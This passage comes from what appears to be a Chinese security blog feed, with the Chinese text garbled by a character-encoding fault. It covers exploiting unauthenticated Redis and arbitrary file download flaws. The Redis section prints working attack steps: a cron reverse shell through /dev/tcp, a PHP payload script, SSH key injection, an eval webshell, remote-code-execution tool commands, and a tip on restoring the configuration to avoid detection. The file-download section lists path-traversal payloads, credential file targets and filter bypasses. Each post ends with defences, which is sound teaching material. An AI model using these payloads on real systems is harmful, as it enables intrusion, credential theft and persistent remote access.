é™¤é”®ä¸ºkeyçš„æ•°æ®</code></pre><ul><li><strong>Redisä¸åŒºåˆ†å‘½ä»¤çš„å¤§å°å†™çš„</strong></li><li><strong>é”®çš„å€¼ä¸­æœ‰ç©ºæ ¼ï¼Œéœ€è¦ä½¿ç”¨åŒå¼•å·æ‹¬</strong></li></ul><h3 id="åˆ©ç”¨"><a class="header-anchor" href="#åˆ©ç”¨">ğŸ­</a>åˆ©ç”¨</h3><h4 id="åˆ©ç”¨è®¡åˆ’ä»»åŠ¡æ‰§è¡Œå‘½ä»¤åå¼¹shell"><a class="header-anchor" href="#åˆ©ç”¨è®¡åˆ’ä»»åŠ¡æ‰§è¡Œå‘½ä»¤åå¼¹shell">ğŸ­</a>åˆ©ç”¨è®¡åˆ’ä»»åŠ¡æ‰§è¡Œå‘½ä»¤åå¼¹shell</h4><p>ä»¥rootæƒé™è¿è¡Œredisï¼Œå…ˆåœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šç›‘å¬ä¸€ä¸ªç«¯å£ï¼š</p><pre><code class="hljs angelscript">nc -lvnp <span class="hljs-number">2333</span></code></pre><p>ç„¶åæ‰§è¡Œå‘½ä»¤:</p><p><img src="/2021/02/24/weakpassword/1.jpg" alt="1"></p><p>å‘½ä»¤åœ¨ä¸Šé¢éƒ½ä»‹ç»è¾½ï¼Œ</p><p><code>/var/spool/cron/</code>æ˜¯ç”¨æˆ·å®šä¹‰çš„è®¾ç½®ï¼ˆæ¯ä¸ªç”¨æˆ·ç”Ÿæˆçš„crontabæ–‡ä»¶ï¼Œéƒ½ä¼šæ”¾åœ¨ /var/spool/cron/ ç›®å½•ä¸‹é¢ï¼‰ï¼Œè¯¥ç›®å½•ä¸‹å­˜æ”¾çš„ä¸ºä»¥å„ä¸ªç”¨æˆ·å‘½åçš„è®¡åˆ’ä»»åŠ¡æ–‡ä»¶ï¼Œrootç”¨æˆ·å¯ä»¥ä¿®æ”¹ä»»æ„ç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡ã€‚</p><p>dbfilenameè®¾ç½®ä¸ºrootä¸ºç”¨rootç”¨æˆ·æƒé™æ‰§è¡Œè®¡åˆ’ä»»åŠ¡ã€‚æ‰§è¡Œå‘½ä»¤åå¼¹shell(å†™è®¡åˆ’ä»»åŠ¡æ—¶ä¼šè¦†ç›–åŸæ¥å­˜åœ¨çš„ç”¨æˆ·è®¡åˆ’ä»»åŠ¡).</p><p>å†™æ–‡ä»¶ä¹‹å‰å…ˆè·å–dirå’Œdbfilenameçš„å€¼ï¼Œä»¥ä¾¿æ¢å¤redisé…ç½®ï¼Œå°†æ”¹åŠ¨é™åˆ°æœ€ä½ï¼Œé¿å…è¢«å‘ç°ã€‚</p><p><code>set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/9999 0&gt;&amp;1\n\n\n&quot; </code>//ç›´æ¥å¾€å½“å‰ç”¨æˆ·çš„crontabé‡Œå†™å…¥åå¼¹shell.</p><h4 id="å‘"><a class="header-anchor" href="#å‘">ğŸ­</a>å‘</h4><p>ä»¥ä¸Šå‘½ä»¤åœ¨æ‰§è¡Œæ—¶ï¼Œä¼šå‡ºç°æŠ¥é”™</p><p><img src="/2021/02/24/weakpassword/2.jpg" alt="2"></p><p><strong>æœªæˆæƒè®¿é—®æ¡ä»¶ï¼š</strong></p><ul><li>æœªå¼€å¯ç™»å½•éªŒè¯ï¼Œå¹¶ä¸”æŠŠIPç»‘å®šåˆ°0.0.0.0</li><li><code>protected-mode</code>å…³é—­</li></ul><p>æ‰€ä»¥åœ¨å®éªŒå‰æˆ‘ä»¬éœ€è¦åœ¨è§£ææ–‡ä»¶é‡Œåšä¸€äº›è®¾ç½®ï¼š</p><pre><code class="hljs angelscript"># bind <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> æˆ–ç»‘å®šä¸º<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-keyword">protected</span>-mode no  <span class="hljs-comment">//Redis protected-mode æ˜¯3.2 ä¹‹ååŠ å…¥çš„æ–°ç‰¹æ€§</span></code></pre><p>æ¯æ¬¡é…ç½®å®Œè¦æ‰§è¡Œ</p><pre><code class="hljs awk">.<span class="hljs-regexp">/redis-server ../</span>redis.conf</code></pre><p>å› ä¸ºLinuxé»˜è®¤æƒ…å†µä¸‹è‹¥åªæ‰§è¡Œ<code>./redis-server</code>æ—¶ä¸ä¼šå°†è§£ææ–‡ä»¶åŒæ­¥ã€‚è¿™ä¸ªå‘ç»•äº†å¥½ä¹…ğŸ’€ğŸ’€ğŸ’€</p><h4 id="Tips-crontabæ–‡ä»¶"><a class="header-anchor" href="#Tips-crontabæ–‡ä»¶">ğŸ­</a>Tips:crontabæ–‡ä»¶</h4><h5 id="æ ¼å¼"><a class="header-anchor" href="#æ ¼å¼">ğŸ­</a>æ ¼å¼:</h5><p><code>åˆ† æ—¶ æ—¥ æœˆ æ˜ŸæœŸ è¦è¿è¡Œçš„å‘½ä»¤</code></p><p>ç¬¬1åˆ—åˆ†é’Ÿ0ï½59<br>ç¬¬2åˆ—å°æ—¶0ï½23ï¼ˆ0è¡¨ç¤ºå­å¤œï¼‰<br>ç¬¬3åˆ—æ—¥1ï½31<br>ç¬¬4åˆ—æœˆ1ï½12<br>ç¬¬5åˆ—æ˜ŸæœŸ0ï½7ï¼ˆ0å’Œ7è¡¨ç¤ºæ˜ŸæœŸå¤©ï¼‰<br>ç¬¬6åˆ—è¦è¿è¡Œçš„å‘½ä»¤</p><p>ä¸¾ä¸ªæ —å­ï¼š</p><pre><code class="hljs angelscript"><span class="hljs-number">45</span> <span class="hljs-number">4</span> <span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">22</span> * * /usr/local/etc/rc.d/lighttpd restartä¸Šé¢çš„ä¾‹å­è¡¨ç¤ºæ¯æœˆ<span class="hljs-number">1</span>ã€<span class="hljs-number">10</span>ã€<span class="hljs-number">22</span>æ—¥çš„<span class="hljs-number">4</span> : <span class="hljs-number">45</span>é‡å¯apacheã€‚</code></pre><h4 id="savephpåå¼¹shell"><a class="header-anchor" href="#savephpåå¼¹shell">ğŸ­</a>savephpåå¼¹shell</h4><p>ä¸Šé¢çš„æ–¹æ³•é‡‡ç”¨bashåå¼¹ï¼ˆä¹‹å‰åœ¨ã€ŠRever Shellã€‹è®²è¿‡äº†ï¼‰ä¹Ÿå¯ä»¥ç”¨å¦ä¸€ç§savephpåå¼¹shell:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$redis = <span class="hljs-keyword">new</span> Redis();$redis-&gt;connect(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">6379</span>);$redis-&gt;auth(<span class="hljs-string">&quot;password&quot;</span>);$redis-&gt;flushall();$redis-&gt;config(<span class="hljs-string">&quot;SET&quot;</span>,<span class="hljs-string">&quot;dir&quot;</span>,<span class="hljs-string">&quot;/var/spool/cron/&quot;</span>);$redis-&gt;config(<span class="hljs-string">&quot;SET&quot;</span>,<span class="hljs-string">&quot;dbfilename&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);$redis-&gt;set(<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1\n\n\n&quot;</span>);$redis-&gt;save();<span class="hljs-meta">?&gt;</span></code></pre><h4 id="å†™SSH-keygen"><a class="header-anchor" href="#å†™SSH-keygen">ğŸ­</a>å†™SSH-keygen</h4><h5 id="åˆ©ç”¨æ¡ä»¶"><a class="header-anchor" href="#åˆ©ç”¨æ¡ä»¶">ğŸ­</a>åˆ©ç”¨æ¡ä»¶</h5><ul><li>RedisæœåŠ¡ä½¿ç”¨ROOTè´¦å·å¯åŠ¨</li><li>æœåŠ¡å™¨å¼€æ”¾äº†SSHæœåŠ¡ï¼Œè€Œä¸”å…è®¸ä½¿ç”¨å¯†é’¥ç™»å½•</li></ul><h4 id="Tipsï¼šLinuxè¿œç¨‹ç™»å½•"><a class="header-anchor" href="#Tipsï¼šLinuxè¿œç¨‹ç™»å½•">ğŸ­</a>Tipsï¼šLinuxè¿œç¨‹ç™»å½•</h4><p>SSHæä¾›ä¸¤ç§ç™»å½•éªŒè¯æ–¹å¼ï¼Œä¸€ç§æ˜¯è´¦å·å¯†ç ç™»å½•ï¼Œå¦ä¸€ç§æ˜¯å¯†é’¥éªŒè¯ã€‚</p><p>æ‰€è°“å¯†é’¥éªŒè¯ï¼Œå…¶å®å°±æ˜¯ä¸€ç§åŸºäºå…¬é’¥å¯†ç çš„è®¤è¯ï¼Œä½¿ç”¨å…¬é’¥åŠ å¯†ã€ç§é’¥è§£å¯†(éå¯¹ç§°)ï¼Œå…¶ä¸­å…¬é’¥æ˜¯å¯ä»¥å…¬å¼€çš„ï¼Œæ”¾åœ¨æœåŠ¡å™¨ç«¯ï¼Œä½ å¯ä»¥æŠŠåŒä¸€ä¸ªå…¬é’¥æ”¾åœ¨æ‰€æœ‰ä½ æƒ³SSHè¿œç¨‹ç™»å½•çš„æœåŠ¡å™¨ä¸­ï¼Œè€Œç§é’¥æ˜¯ä¿å¯†çš„åªæœ‰ä½ è‡ªå·±çŸ¥é“ï¼Œå…¬é’¥åŠ å¯†çš„æ¶ˆæ¯åªæœ‰ç§é’¥æ‰èƒ½è§£å¯†ï¼ˆå¯†ç å­¦çš„çŸ¥è¯†ï¼‰</p><h5 id="åˆ©ç”¨-v2"><a class="header-anchor" href="#åˆ©ç”¨-v2">ğŸ­</a>åˆ©ç”¨</h5><p>æ”»å‡»æœºä¸Šç”Ÿæˆä¸€å¯¹å¯†é’¥</p><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span></code></pre><p>ç™»å½•redis</p><pre><code class="hljs routeros">config <span class="hljs-builtin-name">set</span> dir /root/.ssh/config <span class="hljs-builtin-name">set</span> dbfilename authorized_keys<span class="hljs-builtin-name">set</span> x <span class="hljs-string">&quot;\n\n\nssh-rsa xxxxxxxxx(å¯†é’¥)</span><span class="hljs-string">save</span><span class="hljs-string">ssh -i id_rsa root@xxxxx(ip)   //sshè¿æ¥</span></code></pre><h4 id="å†™webshell"><a class="header-anchor" href="#å†™webshell">ğŸ­</a>å†™webshell</h4><h5 id="åˆ©ç”¨æ¡ä»¶-v2"><a class="header-anchor" href="#åˆ©ç”¨æ¡ä»¶-v2">ğŸ­</a>åˆ©ç”¨æ¡ä»¶</h5><ul><li>å·²çŸ¥webçš„ç»å¯¹è·¯å¾„</li><li>å…·æœ‰è¯»å†™æƒé™</li></ul><p>ç›®å½•çˆ†ç ´çœ‹ä¸‹æ˜¯å¦å­˜åœ¨phpinfoæ–‡ä»¶æ¥è·å–ç»å¯¹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥å°è¯•apacheçš„é»˜è®¤è·¯å¾„ï¼š<code>/var/www/html/</code></p><pre><code class="hljs routeros">Copyredis-cli -h 192.168.67.128config <span class="hljs-builtin-name">set</span> dir /var/www/html <span class="hljs-builtin-name">set</span> xxx <span class="hljs-string">&quot;\n\n\n&lt;?php@eval(<span class="hljs-variable">$_POST</span>[&#x27;c&#x27;]);?&gt;\n\n\n&quot;</span> config <span class="hljs-builtin-name">set</span> dbfilename webshell.php save</code></pre><h4 id="åˆ©ç”¨ä¸»ä»å¤åˆ¶è·å–shell"><a class="header-anchor" href="#åˆ©ç”¨ä¸»ä»å¤åˆ¶è·å–shell">ğŸ­</a>åˆ©ç”¨ä¸»ä»å¤åˆ¶è·å–shell</h4><p>Redisæ”¯æŒä¸»ä»åŒæ­¥ã€‚æ•°æ®å¯ä»¥ä»ä¸»æœåŠ¡å™¨å‘ä»»æ„æ•°é‡çš„ä»æœåŠ¡å™¨ä¸ŠåŒæ­¥ï¼Œä»æœåŠ¡å™¨å¯ä»¥æ˜¯å…³è”å…¶ä»–ä»æœåŠ¡å™¨çš„ä¸»æœåŠ¡å™¨ã€‚è¿™ä½¿å¾—Rediså¯æ‰§è¡Œå•å±‚æ ‘å¤åˆ¶ã€‚å­˜ç›˜å¯ä»¥æœ‰æ„æ— æ„çš„å¯¹æ•°æ®è¿›è¡Œå†™æ“ä½œã€‚ç”±äºå®Œå…¨å®ç°äº†å‘å¸ƒ/è®¢é˜…æœºåˆ¶ï¼Œä½¿å¾—ä»æ•°æ®åº“åœ¨ä»»ä½•åœ°æ–¹åŒæ­¥æ ‘æ—¶ï¼Œå¯è®¢é˜…ä¸€ä¸ªé¢‘é“å¹¶æ¥æ”¶ä¸»æœåŠ¡å™¨å®Œæ•´çš„æ¶ˆæ¯å‘å¸ƒè®°å½•ã€‚åŒæ­¥å¯¹è¯»å–æ“ä½œçš„å¯æ‰©å±•æ€§å’Œæ•°æ®å†—ä½™å¾ˆæœ‰å¸®åŠ©.</p><p>ç›´æ¥ä¸‹è½½è„šæœ¬è¿è¡Œ</p><pre><code class="hljs vim">git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/n0b0dyCN/RedisModules-ExecuteCommand<span class="hljs-keyword">cd</span> RedisModules-ExecuteCommand/<span class="hljs-keyword">make</span>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/Ridter/redis-rce<span class="hljs-keyword">python</span> redis-rce.<span class="hljs-keyword">py</span> -r <span class="hljs-number">192.168</span>.<span class="hljs-number">67.128</span> -L <span class="hljs-number">192.168</span>.<span class="hljs-number">67.129</span> -<span class="hljs-keyword">f</span> module.<span class="hljs-keyword">so</span></code></pre><h4 id="å†™äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåˆ©ç”¨dnsã€icmpç­‰åè®®ä¸Šçº¿ï¼ˆtcpåè®®ä¸èƒ½å‡ºç½‘ï¼‰"><a class="header-anchor" href="#å†™äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåˆ©ç”¨dnsã€icmpç­‰åè®®ä¸Šçº¿ï¼ˆtcpåè®®ä¸èƒ½å‡ºç½‘ï¼‰">ğŸ­</a>å†™äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåˆ©ç”¨dnsã€icmpç­‰åè®®ä¸Šçº¿ï¼ˆtcpåè®®ä¸èƒ½å‡ºç½‘ï¼‰</h4><p><a href="http://www.00theway.org/2017/03/27/redis_exp/">http://www.00theway.org/2017/03/27/redis_exp/</a></p><h4 id="pythonè„šæœ¬"><a class="header-anchor" href="#pythonè„šæœ¬">ğŸ­</a>pythonè„šæœ¬</h4><p><a href="https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py">https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py</a></p><h4 id="æ£€æµ‹æ–¹æ³•"><a class="header-anchor" href="#æ£€æµ‹æ–¹æ³•">ğŸ­</a>æ£€æµ‹æ–¹æ³•</h4><p>â€‹    ç”¨ nmap æ‰«ææŸ¥çœ‹ç«¯å£å¼€æ”¾æƒ…å†µå‘ç°å¼€æ”¾çš„ 6379 ç«¯å£ä¸º Redis çš„é»˜è®¤ç«¯å£</p><pre><code class="hljs angelscript">Nmap -A -p <span class="hljs-number">6379</span> --script redis-info <span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span></code></pre><p>â€‹    Nmap æ‰«æåå‘ç°ä¸»æœºçš„ 6379 ç«¯å£å¯¹å¤–å¼€æ”¾å¯ä»¥é€šè¿‡ Redis å®¢æˆ·ç«¯è¿›è¡Œè¿æ¥æµ‹è¯•æ˜¯å¦å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´å…·ä½“å‘½ä»¤å¦‚ä¸‹</p><pre><code class="hljs angelscript">redis-cli -h <span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span>Info</code></pre><h3 id="é˜²å¾¡"><a class="header-anchor" href="#é˜²å¾¡">ğŸ­</a>é˜²å¾¡</h3><ul><li><p>ç¦æ­¢ä¸€äº›é«˜å±å‘½ä»¤</p></li><li><p>ä»¥ä½æƒé™è¿è¡Œ Redis</p></li><li><p>æ·»åŠ ç™»å½•å¯†ç </p><p>åœ¨é…ç½®æ–‡ä»¶é‡Œæ·»åŠ <code>requirepass mypassword</code></p></li><li><p>ç¦æ­¢å¤–ç½‘è®¿é—® Redis</p><p>åœ¨é…ç½®æ–‡ä»¶ä¸­å–æ¶ˆ<code>bind 127.0.0.1</code>çš„æ³¨é‡Š</p></li><li><p>ä¿®æ”¹é»˜è®¤ç«¯å£</p></li><li><p>ä¿è¯ authorized_keys æ–‡ä»¶çš„å®‰å…¨</p><p>é˜»æ­¢å…¶ä»–ç”¨æˆ·æ·»åŠ æ–°çš„å…¬é’¥ï¼š<br>å°† authorized_keys çš„æƒé™è®¾ç½®ä¸ºå¯¹æ‹¥æœ‰è€…åªè¯»ï¼Œå…¶ä»–ç”¨æˆ·æ²¡æœ‰ä»»ä½•æƒé™ï¼š<br><code>## chmod 400 ~/.ssh/authorized_keys</code></p><p>ä¿è¯ authorized_keys çš„æƒé™ä¸ä¼šè¢«æ”¹æ‰ï¼Œè®¾ç½®è¯¥æ–‡ä»¶çš„ immutable ä½æƒé™ï¼š<br><code>## chattr +i ~/.ssh/authorized_keys</code></p><p>é¿å…å»ºç«‹æ–°çš„sshæ–‡ä»¶ï¼šè®¾ç½® ~./ssh çš„ immutable ä½æƒé™ï¼š<br><code>## chattr +i ~/.ssh</code></p></li><li><p>è®¾ç½®é˜²ç«å¢™ç­–ç•¥</p></li><li><p>é…åˆiptablesé™åˆ¶å¼€æ”¾</p></li></ul><p>ä¸€ä¸ªrediså°±è¿™ä¹ˆå¤šäº†ğŸ’¦ğŸ’¦ğŸ’¦å‰©ä¸‹çš„æ”¹å¤©å§~</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/twosmi1e/p/13308682.html#">https://www.cnblogs.com/twosmi1e/p/13308682.html#</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>File Download</title>
    <link href="/2021/02/24/filedownload/"/>
    <url>/2021/02/24/filedownload/</url>
    
    <content type="html"><![CDATA[<h4 id="æ¦‚è¿°"><a class="header-anchor" href="#æ¦‚è¿°">ğŸ­</a>æ¦‚è¿°</h4><p>ç½‘ç«™å¯¹ç”¨æˆ·ä¸‹è½½æˆ–æŸ¥çœ‹çš„æ–‡ä»¶ä¸åšé™åˆ¶ï¼Œä½¿æ¶æ„ç”¨æˆ·èƒ½å¤Ÿä¸‹è½½æˆ–æŸ¥çœ‹ä»»æ„æ•æ„Ÿæ–‡ä»¶ã€‚</p><h4 id="æˆå› "><a class="header-anchor" href="#æˆå› ">ğŸ­</a>æˆå› </h4><p>å¸¸è§„æ–‡ä»¶ä¸‹è½½æµç¨‹ï¼šä½¿ç”¨ä¸€ä¸ªåŠ¨æ€é¡µé¢ï¼ˆphpã€jspã€aspxã€aspç­‰ï¼‰å°†å¾…ä¸‹è½½æ–‡ä»¶ä½œä¸ºå‚æ•°ä¸€èˆ¬å‚æ•°åç§°ä¸ºfilenameï¼Œå¦‚.php?filename/.jsp?filenameç­‰ã€‚æ ¹æ®å‚æ•°filenameçš„å€¼ï¼Œè·å¾—è¯¥æ–‡ä»¶åœ¨ç½‘ç«™ä¸Šçš„ç»å¯¹è·¯å¾„ï¼Œè¯»å–æ–‡ä»¶ï¼Œç„¶åç›´æ¥å‘é€ç»™å®¢æˆ·ç«¯ä¸‹è½½ã€‚</p><p>å¦‚æœåå°åœ¨æ”¶åˆ°è¯·æ±‚çš„æ–‡ä»¶åå,å°†å…¶<strong>ç›´æ¥æ‹¼è¿›ä¸‹è½½æ–‡ä»¶çš„è·¯å¾„ä¸­è€Œä¸å¯¹å…¶è¿›è¡Œå®‰å…¨åˆ¤æ–­</strong>ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚è‹¥æ”»å‡»è€…æäº¤çš„ä¸æ˜¯ä¸€ä¸ªç¨‹åºé¢„æœŸçš„çš„æ–‡ä»¶åï¼Œè€Œæ˜¯ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„è·¯å¾„(æ¯”å¦‚â€¦/â€¦/â€¦/etc/passwd),åˆ™å¾ˆæœ‰å¯èƒ½ä¼šç›´æ¥å°†è¯¥æŒ‡å®šçš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œä»è€Œå¯¼è‡´åå°æ•æ„Ÿä¿¡æ¯(å¯†ç æ–‡ä»¶ã€æºä»£ç ï¼Œè„šæœ¬ä»£ç ã€æœåŠ¡ä»¥åŠç³»ç»Ÿé…ç½®æ–‡ä»¶)è¢«ä¸‹è½½ã€‚</p><h4 id="åˆ©ç”¨"><a class="header-anchor" href="#åˆ©ç”¨">ğŸ­</a>åˆ©ç”¨</h4><p><em>ç³»ç»Ÿä¿¡æ¯æ”¶é›†â†’çŒœè·¯å¾„â†’ä¸‹è½½é…ç½®æ–‡ä»¶/ä»£ç æ–‡ä»¶â†’åˆ©ç”¨æœåŠ¡å™¨è½¯ä»¶æ¼æ´â†’shellâ†’ææƒ</em></p><p>é¦–å…ˆæ”¶é›†ç³»ç»Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬ç³»ç»Ÿç‰ˆæœ¬ï¼Œä¸­é—´ä»¶ï¼Œcmsç‰ˆæœ¬ï¼ŒæœåŠ¡å™¨ç”¨é€”ï¼ŒæœåŠ¡å™¨ä½¿ç”¨è€…ä¿¡æ¯ï¼Œç«¯å£ï¼Œwebè·¯å¾„ç­‰ï¼Œç„¶åæ ¹æ®æ”¶é›†åˆ°çš„ä¿¡æ¯ï¼Œä¸‹è½½é…ç½®æ–‡ä»¶ï¼Œå¦‚weblogicï¼Œftpï¼Œsshï¼Œç­‰ï¼Œ æ ¹æ®ä¸‹è½½åˆ°çš„é…ç½®æ–‡ä»¶è¿›è¡Œæ¸—é€ã€‚</p><p>demoï¼š</p><p><img src="/2021/02/24/filedownload/1.png" alt="1"></p><h4 id="åˆ©ç”¨æ€è·¯"><a class="header-anchor" href="#åˆ©ç”¨æ€è·¯">ğŸ­</a>åˆ©ç”¨æ€è·¯</h4><ul><li><p>ä¸‹è½½å¯†ç é…ç½®æ–‡ä»¶ï¼šweblogicï¼Œsshï¼Œftpï¼Œæ•°æ®åº“é…ç½®æ–‡ä»¶â€¦â€¦</p></li><li><p>ä¸‹è½½webæ–‡ä»¶ï¼Œè¿›è¡Œç™½ç›’å®¡è®¡ï¼Œå®¡è®¡å¸¸ç”¨çš„æ¼æ´å¹¶åˆ©ç”¨</p></li><li><p>ä¸‹è½½æ—¥å¿—ï¼šæ‰¾åˆ°ç™»å½•/ä¸Šä¼ /åå°/ æ“ä½œï¼Œæ‰¾åˆ°ç™»å½•å…¥å£ å¯ä»¥çˆ†ç ´ï¼Œæµ‹è¯•é»˜è®¤å£ä»¤ï¼Œå¼±å£ä»¤ï¼Œ  æ‰¾åˆ°æ–‡ä»¶ä¸Šä¼ ç‚¹åˆ™æµ‹è¯•æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ‰¾åˆ°åå°æ“ä½œè¯•è¯•æœ‰æ²¡æœ‰æœªæˆæƒè®¿é—®</p></li><li><p>ä¸‹è½½æ•æ„Ÿæ–‡ä»¶</p><pre><code class="hljs awk">index.php?f=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd index.php?f=../index.php index.php?f=file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>passwd</code></pre></li></ul><p>tipsï¼š</p><p>æ³¨æ„ä¸‹è½½æƒé™é—®é¢˜</p><p>ç”¨<code>/root/.bash_history</code>çœ‹æ˜¯å¦å…·æœ‰rootæƒé™</p><p>å¸¸è§åˆ©ç”¨æ–‡ä»¶ï¼š</p><blockquote><p>Windowsï¼š</p><p><code>C:\boot.ini</code>//æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</p><p><code>C:\Windows\System32\inetsrv\MetaBase.xml </code>   //IISé…ç½®æ–‡ä»¶</p><p><code> C:\Windows\repair\sam</code>  //å­˜å‚¨ç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç </p><p><code> C:\Program Files\mysql\my.ini  </code> //Mysqlé…ç½®</p><p><code>C:\Program Files\mysql\data\mysql\user.MYD</code>   //Mysql root</p><p><code>C:\Windows\php.ini   </code>  //phpé…ç½®ä¿¡æ¯</p><p><code>C:\Windows\my.ini </code>   //Mysqlé…ç½®ä¿¡æ¯</p><p><code>C:\Windows\win.ini</code>  //Windowsç³»ç»Ÿçš„ä¸€ä¸ªåŸºæœ¬ç³»ç»Ÿé…ç½®æ–‡ä»¶</p><p>Linuxï¼š</p><p><code> /root/.ssh/authorized_keys</code></p><p><code>  /root/.ssh/id_rsa</code></p><p><code> /root/.ssh/id_ras.keystore</code></p><p><code> /root/.ssh/known_hosts</code>        //è®°å½•æ¯ä¸ªè®¿é—®è®¡ç®—æœºç”¨æˆ·çš„å…¬é’¥</p><p><code>  /etc/passwd</code></p><p><code>/etc/shadow</code></p><p><code>/usr/local/app/php5/lib/php.ini  </code>       //PHPé…ç½®æ–‡ä»¶</p><p><code>/etc/my.cnf   </code>       //mysqlé…ç½®æ–‡ä»¶</p><p><code> /etc/httpd/conf/httpd.conf  </code>     //apacheé…ç½®æ–‡ä»¶</p><p><code>/root/.bash_history  </code>     //ç”¨æˆ·å†å²å‘½ä»¤è®°å½•æ–‡ä»¶</p><p><code>/root/.mysql_history </code>       //mysqlå†å²å‘½ä»¤è®°å½•æ–‡ä»¶</p><p><code>/proc/mounts   </code>      //è®°å½•ç³»ç»ŸæŒ‚è½½è®¾å¤‡</p><p><code>/porc/config.gz   </code>      //å†…æ ¸é…ç½®æ–‡ä»¶</p><p><code> /var/lib/mlocate/mlocate.db</code>      //å…¨æ–‡ä»¶è·¯å¾„</p><p><code>/porc/self/cmdline  </code>      //å½“å‰è¿›ç¨‹çš„cmdlineå‚æ•°</p></blockquote><h4 id="ç®€å•åº”ç”¨"><a class="header-anchor" href="#ç®€å•åº”ç”¨">ğŸ­</a>ç®€å•åº”ç”¨</h4><p>åœ¨ç½‘é¡µä¸­ä¸‹è½½ï¼Œ</p><img src="/2021/02/24/filedownload/2.jpg" alt="2" style="zoom:50%;"><p>å¤åˆ¶é“¾æ¥<code>http://localhost/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png</code></p><p>æ­¤ç½‘ç«™é‡‡ç”¨ä¼ å‚ä¸‹è½½å›¾ç‰‡,æ„é€ payload:<code>http://localhost/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../password.txt</code></p><img src="/2021/02/24/filedownload/3.jpg" alt="3" style="zoom:50%;"><h4 id="æŒ–æ˜"><a class="header-anchor" href="#æŒ–æ˜">ğŸ­</a>æŒ–æ˜</h4><ul><li><p>ç”¨Webæ¼æ´æ‰«æå™¨</p></li><li><p>è§‚å¯Ÿé“¾æ¥</p><pre><code class="hljs nix">â€¢ download.php?<span class="hljs-attr">path=</span>â€¢ download.php?<span class="hljs-attr">file=</span>â€¢ down.php?<span class="hljs-attr">file=</span>â€¢ data.php?<span class="hljs-attr">file=</span>â€¢ readfile.php?<span class="hljs-attr">file=</span>â€¢ read.php?<span class="hljs-attr">filename=</span></code></pre></li><li><p>è§‚å¯Ÿå‚æ•°</p><pre><code class="hljs 1c">â€¢ <span class="hljs-meta">&amp;RealPath=</span>â€¢ <span class="hljs-meta">&amp;FilePath=</span>â€¢ <span class="hljs-meta">&amp;ï¬lepath=</span>â€¢ <span class="hljs-meta">&amp;Filepath=</span>â€¢ <span class="hljs-meta">&amp;Path=</span>â€¢ <span class="hljs-meta">&amp;path=</span>â€¢ <span class="hljs-meta">&amp;inputFile=</span>â€¢ <span class="hljs-meta">&amp;Inputfile=</span>â€¢ <span class="hljs-meta">&amp;url=</span>â€¢ <span class="hljs-meta">&amp;urls=</span>â€¢ <span class="hljs-meta">&amp;Lang=</span>â€¢ <span class="hljs-meta">&amp;dis=</span>â€¢ <span class="hljs-meta">&amp;data=</span>â€¢ <span class="hljs-meta">&amp;Data=</span>â€¢ <span class="hljs-meta">&amp;readï¬le=</span>â€¢ <span class="hljs-meta">&amp;ï¬lep=</span>â€¢ <span class="hljs-meta">&amp;src=</span>â€¢ <span class="hljs-meta">&amp;menu=</span>â€¢ META-INFâ€¢ WEB-INF</code></pre></li></ul><h4 id="ç»•è¿‡"><a class="header-anchor" href="#ç»•è¿‡">ğŸ­</a>ç»•è¿‡</h4><blockquote><p>è¿‡æ»¤å­—ç¬¦æˆ–å­—æ¯å¯å°è¯•ç¼–ç ç»•è¿‡<br>åˆ©ç”¨ â€¦/â€¦/æ—¶æœ‰äº›ä»£ç ä¼šè¿›è¡Œè¿‡æ»¤ï¼šæŠŠ â€¦/ ç½®ç©º</p><blockquote><p>åˆ©ç”¨â€¦// ä»£æ›¿ â€¦/<br>åˆ©ç”¨â€¦// ä»£æ›¿ /</p></blockquote></blockquote><p>ç»“åˆå®é™…åˆ†æ</p><h4 id="é˜²å¾¡"><a class="header-anchor" href="#é˜²å¾¡">ğŸ­</a>é˜²å¾¡</h4><ul><li>è¿‡æ»¤â€œ.â€ç¬¦å·ï¼Œä½¿ç”¨æˆ·åœ¨urlä¸­æ— æ³•å›æº¯åˆ°ä¸Šçº§ç›®å½•ã€‚</li><li>ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ä¸¥æ ¼åˆ¤æ–­ç”¨æˆ·è¾“å…¥å‚æ•°çš„æ 